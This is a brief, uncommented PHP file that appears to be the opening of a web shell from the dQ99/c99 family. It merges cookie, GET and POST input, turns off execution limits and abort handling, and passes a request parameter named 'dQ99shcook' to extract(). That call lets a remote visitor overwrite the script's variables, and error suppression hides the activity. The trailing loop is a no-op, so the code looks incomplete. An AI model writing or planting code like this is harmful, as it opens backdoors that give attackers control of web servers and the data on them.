<?php
@ini_set("max_execution_time",0);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);

$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
@$f = $_REQUEST["f"];
@extract($_REQUEST["dQ99shcook"]);
foreach($_REQUEST as $k => $v) { 
	$k = $v; 
}

?>